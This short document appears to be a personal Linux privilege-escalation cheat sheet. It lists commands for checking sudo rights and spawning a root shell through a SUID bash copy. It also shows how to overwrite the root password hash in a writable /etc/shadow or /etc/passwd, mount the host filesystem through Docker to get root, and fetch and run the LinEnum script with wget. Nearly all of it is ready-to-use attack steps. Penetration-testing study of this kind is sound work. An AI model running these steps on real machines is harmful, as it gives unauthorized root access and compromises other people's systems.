				Sudo 
Can you su without a password?		       su root
are you already a sudo user?			   sudo su -
what can we run with sudo?			  sudo -l

				Spawning root shells
Create a copy of /bin/bash or /bin/sh can you call it rootbash - make sure its owned by the root user. Then use /bin/bash -p to run it

				Writable /etc/shadow
ls -l /etc/shadow					is /etc/shadow writable?
- mkpasswd -m sha-512 password		Makes password Hash
- replace root password hash with the one you just generated
- su root								switch to root

<!-- -->

			 	Writable /etc/passwd
ls -l /etc/passwd					is /etc/passwd writeable?
- openssl passwd password			      Generate password hash
- place the new password hash between the first and second colon (:) of the root user's row (replacing the "x").
- su root							      switch to root

<!-- -->


				Docker
-- get image name using 'docker ps'
-- docker run -v /:/mnt --rm -it $imagenamehere chroot /mnt sh

				LinEnum
-- wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-- ./LinEnum.sh -t -r report.txt

				Misc
-- https://gtfobins.github.io/